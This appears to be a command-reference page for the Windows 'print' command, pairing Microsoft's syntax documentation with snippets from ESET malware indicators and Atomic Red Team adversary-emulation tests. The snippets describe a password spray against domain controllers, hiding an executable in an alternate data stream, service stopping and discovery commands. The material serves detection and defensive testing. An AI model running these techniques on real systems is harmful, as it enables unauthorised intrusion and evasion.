[malware-ioc](https://github.com/eset/malware-ioc) | [winnti_group](https://github.com/eset/malware-ioc/blob/master/winnti_group/README.adoc) | `HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\lltdsvc1\Driver = “EntAppsvc.dll”` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [winnti_group](https://github.com/eset/malware-ioc/blob/master/winnti_group/README.adoc) | `HKLM\SOFTWARE\Microsoft\Print\Components\DC20FD7E-4B1B-4B88-8172-61F0BED7D9E8` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [winnti_group](https://github.com/eset/malware-ioc/blob/master/winnti_group/README.adoc) | `HKLM\SOFTWARE\Microsoft\Print\Components\A66F35-4164-45FF-9CB4-69ACAA10E52D` | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1016.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md) | if [ -x "$(command -v netstat)" ]; then netstat -ant \| awk '{print $NF}' \| grep -v '[a-z]' \| sort \| uniq -c; else echo "netstat is missing from the machine. skipping..."; fi; | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | Upon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1027.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.004/T1027.004.md) | Upon execution, the exe will print 'T1027.004 Dynamic Compile'. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.006.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036.006/T1036.006.md) | 1. 1. echo '#!/bin/bash\necho "print \"hello, world!\"" \| /usr/bin/python\nexit' > execute.txt && chmod +x execute.txt | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1083.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md) | cd $HOME && find . -print \| sed -e 's;[^/]*/;\|__;g;s;__\|; \|;g' > #{output_file} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1087.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.md) | username=$(echo $HOME \| awk -F'/' '{print $3}') && lsof -u $username | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1110.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.md) | This atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\users.txt list. Any successful authentications will be printed to the screen with a message like "[*] username:password", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1489.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1489/T1489.md) | Stops a specified service using the net.exe command. Upon execution, if the service was running "The Print Spooler service was stopped successfully." | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1489.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1489/T1489.md) | will be displayed. If the service was not running, "The Print Spooler service is not started." will be displayed and it can be | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1546.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.001/T1546.001.md) | * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [apis-execution-frameworks.md](https://github.com/redcanaryco/atomic-red-team/blob/master/docs/apis-execution-frameworks.md) | ### Example: print all the Atomic Tests by ATT&CK technique | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)

## Additional Info*

**The information below is copied from [MicrosoftDocs](https://github.com/MicrosoftDocs/windowsserverdocs), which is maintained by [Microsoft](https://opensource.microsoft.com/codeofconduct/). Available under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/) license.*

---

## print

Sends a text file to a printer. A file can print in the background if you send it to a printer connected to a serial or parallel port on the local computer.

> [!NOTE]
> You can perform many configuration tasks from the command prompt by using the [Mode command](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/mode.md), including configuring a printer connected to a parallel or a serial port, displaying printer status, or preparing a printer for code page switching.

### Syntax

```
print [/d:<printername>] [<drive>:][<path>]<filename>[ ...]
```

#### Parameters

| Parameter | Description |
|--|--|
| /d:`<printername>` | Specifies the printer that you want to print the job. To print to a locally connected printer, specify the port on your computer where the printer is connected. Valid values for parallel ports are **LPT1**, **LPT2**, and **LPT3**. Valid values for serial ports are **COM1**, **COM2**, **COM3**, and **COM4**. You can also specify a network printer by using its queue name (`\\server_name\printer_name`). If you don't specify a printer, the print job is sent to **LPT1** by default. |
| `<drive>`: | Specifies the logical or physical drive where the file you want to print is located. This parameter isn't required if the file you want to print is located on the current drive. |
| `<path>` | Specifies the location of the file you want to print. This parameter isn't required if the file you want to print is located in the current directory. |
| `<filename>[ ...]` | Required. Specifies the file you want to print. You can include multiple files in one command. |
| /? | Displays help at the command prompt. |

#### Examples

To send the **report.txt** file, located in the current directory, to a printer connected to **lpt2** on the local computer, type:

```
print /d:lpt2 report.txt
```

To send the **report.txt** file, located in the **c:\accounting** directory, to the **printer1** print queue on the **/d:\\copyroom** server, type:

```
print /d:\\copyroom\printer1 c:\accounting\report.txt
```

### Additional References

- [Command-Line Syntax Key](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md)

- [Print Command Reference](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/print-command-reference.md)

- [Mode command](https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/mode.md)

---



MIT License. Copyright (c) 2020 Strontic.


